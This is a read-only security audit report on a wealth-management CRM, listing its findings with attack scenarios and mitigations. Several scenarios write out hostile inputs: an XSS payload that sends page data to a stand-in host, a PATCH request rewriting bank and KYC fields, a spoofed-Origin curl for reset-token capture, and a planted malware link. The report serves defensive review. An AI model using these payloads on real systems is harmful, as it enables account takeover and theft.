# Niyom Wealth Management CRM — Security Assessment Report

| Field | Value |
|---|---|
| **Assessment type** | Read-only security audit (no code changes) |
| **Date** | 2026-07-01 |
| **Codebase state** | Post-Phase 3 · commit ~5a1ae68 + Phase 1–3 (uncommitted) |
| **Reviewers** | Principal Cyber Security Architect · Senior Application Security Engineer · FinTech Security Consultant · OWASP ASVS Reviewer · Penetration Tester · Secure Code Reviewer |
| **Standards referenced** | OWASP Top 10 (2021) · OWASP ASVS v4 · OWASP API Top 10 (2023) · SEBI IT Systems Circular · AMFI Code of Conduct · DPDP Act 2023 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Security Score](#2-security-score)
3. [Architecture Risk Assessment](#3-architecture-risk-assessment)
4. [Findings](#4-findings)
   - [Critical Findings](#-critical-findings-3)
   - [High Findings](#-high-findings-8)
   - [Medium Findings](#-medium-findings-7)
   - [Low Findings](#-low-findings-6)
   - [Informational](#ℹ️-informational-5)
5. [Positive Security Practices Already in Place](#5-positive-security-practices-already-in-place)
6. [Secure Coding Recommendations](#6-secure-coding-recommendations)
7. [Priority Remediation Roadmap](#7-priority-remediation-roadmap)
8. [Verdict for Production Readiness](#8-verdict-for-production-readiness)
9. [Out-of-scope Notes](#9-out-of-scope-notes)

---

## 1. Executive Summary

Niyom Wealth's CRM has invested visibly in the *foundational* security pattern: RLS on core tables, service-role isolation, an atomic RPC + DB trigger pattern for auditability, and enumeration-safe email flows on the newer surfaces (staff password reset). Those are real strengths.

However, the platform is **not yet ready for a production regulated-financial deployment**. The audit surfaced **3 CRITICAL** and **8 HIGH** findings that would each be sufficient reason for a bank / SEBI-supervised distributor to refuse go-live sign-off. The two most severe are:

1. **Clients can rewrite their own KYC + bank details** via a direct REST call — the `nw_clients` UPDATE policy is column-unrestricted.
2. **Phone OTPs are logged in cleartext to edge-function logs** *and* stored unhashed in the DB — an insider or a leaked log stream defeats phone-based 2FA entirely.

A third critical finding is stored-XSS-with-token-theft on the public debit-note preview page via `dangerouslySetInnerHTML` fed unescaped DB fields.

**Recommended posture:** hold back production launch of the Client Portal + Public Debit Note view until the CRITICAL and HIGH items are closed. The employee-only CRM surface is closer to acceptable but still needs the HIGH items resolved before any gateway integration.

---

## 2. Security Score

| Dimension | Score / 100 |
|---|---|
| Authentication & session | 62 |
| Authorization / RLS | 55 |
| Data validation / injection | 70 |
| Storage & document handling | 74 |
| Audit & non-repudiation | 82 |
| Secrets / configuration | 78 |
| Frontend hardening | 48 |
| Compliance readiness (SEBI/AMFI/DPDP) | 52 |
| **Overall** | **63 / 100** |

**Interpretation:** Not production-ready for a regulated financial platform. Target ≥ 85 before Client Portal / Gateway launch.

---

## 3. Architecture Risk Assessment

| Area | Risk | Rationale |
|---|---|---|
| Client Portal | **HIGH** | Column-unrestricted UPDATE + email disclosure via PAN lookup |
| CRM (employee) | Medium | RLS correct on most tables; OTP/log leakage weakens phone-2FA |
| Public deal / debit-note pages | **HIGH** | `dangerouslySetInnerHTML` on stored user data + open redirect surfaces |
| Data-refresh functions | **HIGH** | `update-commodity-prices`, `update-mutual-funds`, `update-unlisted-shares` accept POSTs with **no authorization check** |
| Payment surface (Phase 1–3) | Low–Medium | Atomic RPCs + DB triggers are solid; residual concerns on idempotency + supporting_docs validation |
| Storage buckets | Low | Both buckets private; signed URLs 120 s; write path restricted to edge functions |

---

## 4. Findings

Format for each finding: **Description · Impact · Attack scenario · Affected files · Root cause · Recommended mitigation · Estimated effort**.

---

### 🔴 CRITICAL FINDINGS (3)

#### C-1 · Client can overwrite own KYC and bank details via direct REST call

**Description.** The `nw_clients` UPDATE policy for the client portal (`supabase/migrations/20260523142353_add_client_portal_rls_policies.sql:32-36`) is:

```sql
USING  (client_auth_user_id = auth.uid())
WITH CHECK (client_auth_user_id = auth.uid())
```

It restricts *which row* the client can update but not *which columns*. Every column on `nw_clients` — including `email`, `phone`, `pan`, `bank_account`, `bank_ifsc`, `bank_name`, `address`, `employee_id`, `dsa_id`, `verification_status` — is writeable by the client.

**Impact.**

- Account takeover of the *paying* side of any transaction: rewriting `email` re-routes future secure-link / OTP / receipt emails to an attacker inbox.
- Bank-account substitution: rewriting `bank_account` / `bank_ifsc` corrupts future deal-confirmation snapshots and debit-note payouts.
- Assignment fraud: rewriting `employee_id` / `dsa_id` moves the client into another RM's book (commission attribution).
- Bypass of AMFI/SEBI KYC integrity requirements.

**Attack scenario.** A logged-in client sends:

```
PATCH /rest/v1/nw_clients?id=eq.<own_id>
Content-Type: application/json
Authorization: Bearer <client jwt>

{"email":"attacker@x.com","bank_account":"1122334455","bank_ifsc":"HDFC0000001","verification_status":"verified"}
```

RLS accepts. Response 204. All KYC/payment routing is now attacker-controlled.

**Affected files.** `supabase/migrations/20260523142353_add_client_portal_rls_policies.sql:32-36`; implicit `PATCH` risk in `src/pages/ClientPortal.tsx:64`.

**Root cause.** Column-level authorization not encoded in the policy. The comment on the migration says the intent was only to allow `client_password_changed` — that intent isn't enforced.

**Mitigation.**

1. Drop the broad UPDATE policy.
2. Replace with an UPDATE policy that either (a) invokes a `SECURITY DEFINER` RPC `nw_client_set_password_changed()` that flips only that column, or (b) uses column-level GRANTs so `authenticated` can only UPDATE `client_password_changed`, or (c) uses a `BEFORE UPDATE` trigger that raises if any column other than `client_password_changed` was modified when `auth.uid() = client_auth_user_id`.

**Estimated effort.** 1–2 hours (single migration + regression test).

---

#### C-2 · Phone OTPs logged in cleartext and stored unhashed

**Description.**

- `supabase/functions/send-otp/index.ts:65` — `console.log('OTP for ${cleanPhone}: ${code}');` — the OTP hits Supabase edge-function logs (retained + accessible to anyone with Supabase dashboard access, including CI log-shipping consumers).
- `supabase/functions/send-otp/index.ts:60` — the same OTP is inserted into `nw_otps` **as plaintext** (`otp: code`), whereas the newer `send-deal-otp` stores `otp_hash` under a keyed SHA-256. `nw_otps` therefore stores unhashed secrets.
- Both `send-otp` and `send-deal-otp` generate the OTP using **`Math.random()`** (non-cryptographic). Predictable enough for aggressive brute-force in some contexts.

**Impact.** Any insider with log or DB read access defeats the phone 2FA entirely. Adversary-in-the-middle on the log-shipping pipeline (SIEM, retention buckets) sees every OTP ever issued. Predictable `Math.random()` also weakens brute-force resistance if rate limits are lifted or bypassed.

**Attack scenario.** Contractor with read-only Supabase log access exports OTP tokens in near-real-time; uses them to complete phone OTP challenges before the legitimate user.

**Affected files.**

- `supabase/functions/send-otp/index.ts:10-12,55-65`
- `supabase/functions/send-deal-otp/index.ts:20-22`

**Root cause.** OTP flow written before the hashed-OTP pattern in `send-reset-otp` / `send-deal-otp` was standardised, and never refactored back.

**Mitigation.**

1. Remove the `console.log` immediately.
2. Store `otp_hash` (SHA-256 with per-request pepper) instead of the raw code — mirror the pattern in `supabase/functions/send-reset-otp/index.ts:50-55`.
3. Replace `Math.random()` with `crypto.getRandomValues()` (with rejection sampling, as `send-reset-otp` does).
4. Add a DB-side one-time-use enforcement (mark row as consumed on first verify to prevent replay).

**Estimated effort.** 3–4 hours (one edge-function rewrite + one migration + one lightweight test).

---

#### C-3 · Stored XSS on public Debit Note preview page

**Description.** `src/pages/PublicDebitNoteView.tsx:193-195` renders `previewHtml` via `dangerouslySetInnerHTML`. `previewHtml` is produced by `buildDebitNoteHtml()` (`src/crm/dsaDebitNote.ts:129`), which **interpolates raw DB fields** (`dsa.full_name`, `dsa.address`, `p.client_name`, `p.product_name`, etc.) directly into an HTML string with no escaping. DSA and client fields are populated during onboarding.

**Impact.** Stored XSS on an **unauthenticated public page**. React does not execute inline `<script>` inserted via `dangerouslySetInnerHTML`, but event handlers on interpolated tags (`<img src=x onerror=…>`) *do* fire. Consequences on this page include:

- Theft of the DSA's own secure-token from the URL, which enables sign-in impersonation.
- Cross-site request forgery against Supabase from the victim's origin.
- Cryptomining / phishing overlay on a page bearing Niyom branding.

**Attack scenario.**

1. Attacker gains a DSA account via the sourcing flow (or is a real DSA turned malicious).
2. Attacker edits their own `nw_dsas.full_name` to `<img src=x onerror="fetch('https://a.example/?t='+location.pathname)">`.
3. When a client / another DSA visits the public debit-note preview containing that particular, the payload fires.

Same class of issue affects the client-side PDF generation in `src/crm/paymentReceipt.ts:333` and `src/crm/dsaDebitNote.ts:330,360` (via `wrap.innerHTML = build…()`), though those run in an off-screen div in an authenticated CRM context (still bad, lower blast radius).

**Affected files.**

- `src/pages/PublicDebitNoteView.tsx:193-195`
- `src/crm/dsaDebitNote.ts:129-311`
- `src/crm/paymentReceipt.ts:107-291`

**Root cause.** Template literals build HTML by string concatenation of untrusted DB fields.

**Mitigation.**

1. Introduce a small `escapeHtml()` helper and wrap every `${…}` interpolation of user/DB text in both `buildDebitNoteHtml` and `paymentReceipt.buildHtml`.
2. On the public page, prefer rendering the debit note via React JSX (which auto-escapes) instead of `dangerouslySetInnerHTML`.
3. Add a strict `Content-Security-Policy` header on the public pages: `default-src 'self'; script-src 'self'; frame-ancestors 'none'; object-src 'none'`.

**Estimated effort.** 4–6 hours (helper + call-site sweep + CSP header).

---

### 🟠 HIGH FINDINGS (8)

#### H-1 · Client PAN-lookup endpoint enables PAN enumeration + email disclosure

**Description.** `supabase/functions/client-pan-login/index.ts:32-51` returns `{ client_id, client_email, password_changed }` for any known PAN. Rate limiting is client-side only (sessionStorage).

**Impact.** Given a PAN (widely known — appears on issued invoices, ITR filings), an attacker retrieves the client's registered email → precursor to targeted phishing + password reset abuse.

**Attack scenario.** Automated PAN dictionary against `/functions/v1/client-pan-login` yields a mapping of PAN → email → RM.

**Affected files.** `supabase/functions/client-pan-login/index.ts`.

**Root cause.** Endpoint returns identifying data before authenticating the client.

**Mitigation.** Return only a boolean `password_changed` and require the client to enter their email themselves; add server-side per-IP + per-PAN rate limits with exponential backoff; log enumeration attempts.

**Estimated effort.** 3–4 hours.

---

#### H-2 · Data-refresh edge functions accept unauthenticated writes

**Description.** `supabase/functions/update-commodity-prices/index.ts` accepts `POST { commodity, price, price_date }` and upserts into `commodity_prices` using the **service role**. There is *no employee lookup, no role check, no shared secret*. Verified same pattern in `supabase/functions/update-mutual-funds/index.ts` and `supabase/functions/update-unlisted-shares/index.ts`.

**Impact.** Any authenticated Supabase user (including any client-portal user) can mutate the pricing datasets on which valuations, MIS reports, and mutual-fund research are built.

**Attack scenario.** Malicious client sets `HDFC EQ 2026 = ₹0.01`, then dumps positions after the next portfolio revaluation.

**Affected files.**

- `supabase/functions/update-commodity-prices/index.ts`
- `supabase/functions/update-mutual-funds/index.ts`
- `supabase/functions/update-unlisted-shares/index.ts`

**Root cause.** Functions inherit `verify_jwt = true` (satisfying merely "authenticated") but never verify the caller is an admin employee.

**Mitigation.** Add an employee-lookup + admin-role check identical to `create-crm-user`, OR gate behind a shared-secret header used by the cron caller only.

**Estimated effort.** 1 hour per function.

---

#### H-3 · Public onboarding enables PAN enumeration and rate-unlimited row creation

**Description.** `supabase/functions/public-client-onboard/index.ts:40-50` responds `409 "A client with this PAN already exists"` on duplicate — a textbook enumeration oracle. No CAPTCHA, no rate limit, no anti-automation.

**Impact.** Same PAN-mapping problem as H-1, plus mass row-creation DoS potential.

**Attack scenario.** Automated onboarding attempts with PAN dictionaries; response code distinguishes registered vs. unregistered PANs.

**Affected files.** `supabase/functions/public-client-onboard/index.ts`.

**Root cause.** Distinct response codes leak state; no throttling.

**Mitigation.** Enumeration-safe generic response ("If not registered, you will receive an email…"); Turnstile/hCaptcha on the onboarding page; per-IP + per-PAN rate limits.

**Estimated effort.** 3–4 hours.

---

#### H-4 · Open-redirect in staff password reset via `Origin`/`Referer` header

**Description.** `supabase/functions/secure-password-reset/index.ts:56-59` computes `redirectTo` from the request's `Origin` header. An attacker can post to the endpoint with `Origin: https://attacker.example` — Supabase will mint a recovery link that redirects there. When the victim clicks the reset link in their inbox, the reset token can be captured on the attacker origin.

**Impact.** Full password reset takeover of any staff account whose owner clicks a reset link.

**Attack scenario.** Attacker POSTs `{ email: victim@niyom }` from `curl -H "Origin: https://n1yom.com" ...`; victim gets a reset email; victim clicks; Supabase sends token to `n1yom.com/crm`; attacker uses it.

**Affected files.**

- `supabase/functions/secure-password-reset/index.ts:56-64`
- `supabase/functions/secure-client-password-reset/index.ts` (same class of issue)

**Root cause.** Trusting a client-controlled header for a security-critical redirect target.

**Mitigation.** Ignore `Origin` / `Referer`; use a hard-coded allowlist of production redirect URIs (`https://niyomwealth.com/crm`).

**Estimated effort.** 30 minutes.

---

#### H-5 · `send-lead-notification` reflects arbitrary attacker content into a public WhatsApp URL

**Description.** `supabase/functions/send-lead-notification/index.ts:18-45` accepts unauthenticated JSON, concatenates into a message string, encodes to a `wa.me` URL, and returns it to the caller — no field validation, no length caps, no content filters. It also logs the entire lead (including phone and email) via `console.log`.

**Impact.** Enables (a) phishing URL construction against the internal WhatsApp inbox with attacker-controlled content, (b) PII log leakage of every lead into Supabase logs, (c) unbounded log growth.

**Attack scenario.** Attacker POSTs a lead with attacker-crafted content in `additionalNotes`; the returned `wa.me` link opens a WhatsApp draft with a phishing message spoofing legitimate Niyom notes.

**Affected files.** `supabase/functions/send-lead-notification/index.ts`.

**Root cause.** Public endpoint concatenates raw input into a shareable URL and PII into logs.

**Mitigation.** Validate + trim + sanitise every field; strip control characters; cap length; remove `console.log`; if the intention is that Supabase forwards this to WhatsApp / email, do it server-side and don't hand the URL back.

**Estimated effort.** 1–2 hours.

---

#### H-6 · No CSP / security headers on the deployed frontend

**Description.** No `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` configured in `vercel.json` or the app's HTML. React does prevent inline scripts by default, but the absence of a CSP makes C-3 far more damaging and leaves the app open to clickjacking (`X-Frame-Options: DENY` is not set).

**Impact.** Any XSS finding automatically escalates to a full-session-takeover finding. Clickjacking is possible on the CRM.

**Attack scenario.** Attacker embeds `/crm` in an `<iframe>` on a phishing site; overlays a transparent button that causes users to trigger destructive actions.

**Affected files.** `vercel.json` · `index.html`.

**Root cause.** Deployment defaults; no explicit hardening.

**Mitigation.** Add to `vercel.json`:

```json
"headers":[{"source":"/(.*)","headers":[
  {"key":"Content-Security-Policy","value":"default-src 'self'; script-src 'self'; connect-src 'self' https://*.supabase.co https://api.resend.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; object-src 'none'"},
  {"key":"Strict-Transport-Security","value":"max-age=63072000; includeSubDomains; preload"},
  {"key":"X-Content-Type-Options","value":"nosniff"},
  {"key":"Referrer-Policy","value":"strict-origin-when-cross-origin"},
  {"key":"Permissions-Policy","value":"geolocation=(), microphone=(), camera=()"}
]}]
```

**Estimated effort.** 1 hour.

---

#### H-7 · CORS `Access-Control-Allow-Origin: "*"` on every edge function

**Description.** Every edge function reviewed returns `Access-Control-Allow-Origin: *`. Combined with the fact that most functions use the caller's bearer token, this allows *any* origin (a malicious CRM lookalike, an attacker's landing page) to invoke the functions on behalf of a logged-in user. The wildcard has no defensive value and hides real errors.

**Impact.** Weakens defence in depth; every future CSRF/token-exfiltration variant has a wider blast radius.

**Attack scenario.** Attacker hosts `n1yom.com`; social-engineers RM to open a page that fires background `fetch()` calls to the real `/functions/v1/*` endpoints, replaying token from the RM's other tab.

**Affected files.** All 29 files under `supabase/functions/*/index.ts`.

**Root cause.** Default-copy pattern across every function.

**Mitigation.** Replace `*` with an origin allowlist (`https://niyomwealth.com`, dev host) via a shared `corsHeaders(req)` helper.

**Estimated effort.** 2 hours (mechanical sweep).

---

#### H-8 · Payment `supporting_docs` JSONB accepts arbitrary storage paths without validation

**Description.** `nw_deal_payments.supporting_docs` (defined in `supabase/migrations/20260701130100_create_deal_payments.sql`) is a free-form JSONB that will be populated (per SDD Phase 4) from a client-side uploader. There is no server-side allowlist of buckets/paths, MIME check, or size cap in the codebase reviewed. Once the field is populated, RLS on the payment row lets an authenticated employee store any string.

**Impact.** Points a downstream download UI at any storage object the employee can enumerate; potential SSRF when consumed by a future document viewer. Also enables phishing (embed an attacker URL as a "document" that opens in the browser).

**Attack scenario.** Malicious employee stores `[{ "path": "https://attacker.example/malware.exe" }]`; another RM's browser follows the link when reviewing the payment.

**Affected files.** `supabase/migrations/20260701130100_create_deal_payments.sql`.

**Root cause.** Untyped JSONB accepted without schema validation.

**Mitigation.** Introduce a JSON-schema CHECK constraint on `supporting_docs` restricting `path` to the `deal-documents` bucket namespace + a bounded MIME allowlist (`application/pdf`, `image/png`, `image/jpeg`) + a size field cap. Or move uploads through a dedicated edge function that validates before it writes the JSONB entry.

**Estimated effort.** 2–3 hours.

---

### 🟡 MEDIUM FINDINGS (7)

| # | Finding | File | Fix |
|---|---|---|---|
| M-1 | `DEAL_OTP_PEPPER` optional (falls back to `""`) in `send-deal-otp/index.ts:25-29` and `accept-deal`/`reject-deal`. If missing in prod, all OTP hashes become deterministic from `otp:token` alone. | `send-deal-otp`, `accept-deal`, `reject-deal`, `send-reset-otp`, `reset-password-with-otp` | Fail-closed if pepper unset; add a health check |
| M-2 | `SET search_path = public` on SECURITY DEFINER — good, but a few triggers (`nw_payment_bump_version`, `nw_receipt_audit_after_update`) rely on the parent function being definer — verify with `pg_dump` post-deploy | migrations `20260701130100`, `20260701140000` | Audit `\df+` on prod |
| M-3 | No idempotency-key on `record-payment` / `upload-receipt` / `send-payment-acknowledgement` — double-click or retried request creates duplicates (payment blocked by UTR unique index only) | `record-payment`, `upload-receipt`, `send-payment-acknowledgement` | Accept `Idempotency-Key` header, dedupe in a small `nw_idempotency` table |
| M-4 | Signed URL TTL 60–120 s on private downloads is reasonable but no CSRF nonce; a leaked URL screenshot within the window is reusable | `upload-receipt`, `DealConfirmation.tsx` `handleDownloadSigned` | Shorter TTL for high-sensitivity endpoints; track download events |
| M-5 | Rate limiting for staff/OTP flows relies on a single-writer race window (`SELECT most-recent → INSERT`) rather than a UNIQUE constraint or an advisory lock | `send-reset-otp`, `send-deal-otp`, `reset-password-with-otp` | Use `INSERT ... ON CONFLICT` on `(email, purpose)` with a check on `created_at` |
| M-6 | Frontend logs errors including `err.message` from `insErr` to browser console with SQL-flavoured text (constraint names). Info-leak to XSS payloads or dev-tools scrapers. | Multiple `.tsx` files | Map to generic messages for display; keep detailed message in server-side log only |
| M-7 | `console.error` in edge functions logs `err?.message` — messages sometimes contain PII paths (e.g. `receipt_path`, `deal_id`). Ok for internal but worth PII-tagging when a SIEM ingests them | All edge functions | Introduce a small `redact()` helper |

---

### 🟢 LOW FINDINGS (6)

| # | Finding | Fix |
|---|---|---|
| L-1 | Public bucket check: verified both `deal-documents` and `dsa-debit-notes` are private (`public = false`) ✓ — but `storage.buckets` has no ownership/RLS beyond that. Confirm on prod. | Operational check |
| L-2 | `crypto.subtle.digest("SHA-256", ...)` used consistently for OTP hashing on newer surfaces ✓ | — |
| L-3 | Send OTPs don't include a "device fingerprint" salt — a stolen OTP works from any browser | Consider binding OTP to session id in metadata |
| L-4 | No account-lockout / progressive-delay after N failed logins at Supabase Auth layer (Supabase's built-in throttle only) | Configure Supabase Auth lockout thresholds |
| L-5 | No SBOM / dependency scanning enforced in CI (`html2pdf.js`, `html2canvas` versions unpinned in Dependabot?) | Add `npm audit` gate; consider Renovate |
| L-6 | Session tokens live in `localStorage` (Supabase default) — XSS ⇒ token theft | Explore httpOnly cookie mode when it stabilises |

---

### ℹ️ INFORMATIONAL (5)

| # | Note |
|---|---|
| I-1 | `.env` correctly listed in `.gitignore` ✓ |
| I-2 | Immutability trigger `nw_block_accepted_deal_update` is enforced ✓ |
| I-3 | Payment allocation is atomic under `FOR UPDATE` — stronger than the debit-note pattern ✓ |
| I-4 | Audit trails append-only via DB triggers ✓ |
| I-5 | Storage upload path uses `upsert: true` on primary + `upsert: false` on history — history is preserved ✓ |

---

## 5. Positive Security Practices Already in Place

- Atomic RPCs for payment / receipt (`nw_insert_payment`, `nw_finalize_receipt`) — race-free.
- AFTER-INSERT / AFTER-UPDATE triggers write audit rows in the same transaction as the mutation — no bypass path for audit.
- Enumeration-safe generic response on staff password reset.
- OTP hashing with SHA-256 + peppered inputs on newer surfaces.
- Deal immutability enforced at both RLS and trigger levels.
- Storage buckets are private with signed-URL-only reads.
- Employee ownership checked in *both* the edge function and RLS.
- Snapshotting client fields into `snap_*` columns preserves the historical record post-acceptance.

---

## 6. Secure Coding Recommendations

1. **One helper per PDF file** — `escapeHtml(s: string): string` — and enforce via lint (`no-template-curly-in-string`-style ESLint rule for `buildHtml`).
2. **A single `authorizedEmployee(req)` helper** shared across edge functions — anon-key client → `getUser` → `nw_employees` row lookup → return or 401. Eliminates copy-paste divergence between the audited 8 and the un-audited 21.
3. **A single `withCorsHeaders(req, origin_allowlist)` helper** to replace the `*` wildcard.
4. **Standard OTP kit** in `_shared/otp.ts` — `generateOtp()` using `crypto.getRandomValues`, `hashOtp(otp, id, pepper)`, `verifyOtp(row, provided)` with attempt tracking. Migrate `send-otp` onto it.
5. **Idempotency-key middleware** — small `nw_idempotency (key uuid PK, function_name text, response_body jsonb, expires_at timestamptz)` table + helper.
6. **CSP defense-in-depth** (H-6) is essentially free; do it first.
7. **A weekly report:**

   ```sql
   SELECT event_type, COUNT(*)
   FROM nw_deal_confirmation_events
   WHERE created_at > now() - interval '7 days'
   GROUP BY event_type;
   ```

   proves the audit chain is live.

---

## 7. Priority Remediation Roadmap

### Immediate (must fix before production)

| Ref | Fix | Effort |
|---|---|---|
| **C-1** | Column-scoped UPDATE policy for clients on `nw_clients` | 1–2 h |
| **C-2** | Remove OTP `console.log`; migrate `send-otp` to hashed + `crypto.getRandomValues` | 3–4 h |
| **C-3** | HTML-escape all `${…}` in `buildDebitNoteHtml` and `paymentReceipt.buildHtml`; render public debit-note via JSX | 4–6 h |
| **H-2** | Add admin auth check to `update-commodity-prices`, `update-mutual-funds`, `update-unlisted-shares` | 3 h |
| **H-4** | Hard-code `redirectTo` in `secure-password-reset` and `secure-client-password-reset` | 30 min |
| **H-6** | Add CSP / security headers via `vercel.json` | 1 h |

**Total: ~1.5–2 person-days.**

### Before Payment Gateway integration

| Ref | Fix | Effort |
|---|---|---|
| **H-1** | Kill PAN-based email disclosure in `client-pan-login`; server rate-limit | 3–4 h |
| **H-3** | Enumeration-safe `public-client-onboard` + CAPTCHA + rate limit | 3–4 h |
| **H-5** | Sanitise + rate-limit `send-lead-notification`; remove `console.log` PII | 1–2 h |
| **H-7** | Origin allowlist across all edge functions | 2 h |
| **H-8** | Constrain `supporting_docs` JSONB with schema/CHECK | 2–3 h |
| **M-3** | Idempotency-key middleware on all mutating edge functions | 4–6 h |
| **M-1** | Fail-closed pepper handling | 1 h |
| **M-5** | Use `ON CONFLICT` / advisory-lock for OTP rate limiting | 2 h |

**Total: ~2.5 person-days.**

### Long-term (before regulator inspection)

- Formal SBOM + monthly `npm audit` gate in CI.
- Supabase-Auth lockout policy configured (L-4).
- Migrate session storage to httpOnly cookies when Supabase supports it stably (L-6).
- Third-party pentest against the Client Portal after C-1/H-1 fixes.
- ISO 27001 / SOC 2 gap-assessment aligned with the DPDP Act 2023 obligations for financial data.
- Storage-object antivirus scanning (ClamAV / VirusTotal) for KYC and receipt uploads.
- Introduce `payment-webhook` HMAC verification layer *before* Razorpay/Cashfree wiring — pre-baked in the schema, not yet in code.

---

## 8. Verdict for Production Readiness

- **Employee CRM only, admin-controlled RM population, no client portal, no public onboarding** → **acceptable after the CRITICAL 3 + H-2 / H-4 / H-6 are fixed** (roughly 2 days).
- **Full Client Portal + Public Onboarding + Payment Gateway** → **not acceptable** until the entire "Before Payment Gateway" list is closed (roughly 4.5 days) *and* an external pentest confirms C-1 / C-3 fixes.

---

## 9. Out-of-scope Notes

This audit did not exercise:

- The actual Supabase Auth configuration (JWT rotation window, session TTL, MFA settings — read the dashboard).
- Runtime testing of the fixes (this was a read-only pass).
- Third-party Resend / MSG91 account configuration (SPF/DKIM/DMARC alignment for `niyomwealth.com`).
- Node/Deno version and dependency CVE surface.

Each of these deserves its own hardening pass before production launch.

---

**Prepared by:** Principal Cyber Security Architect (read-only assessment) · **Date:** 2026-07-01
**No code was modified during this audit.**
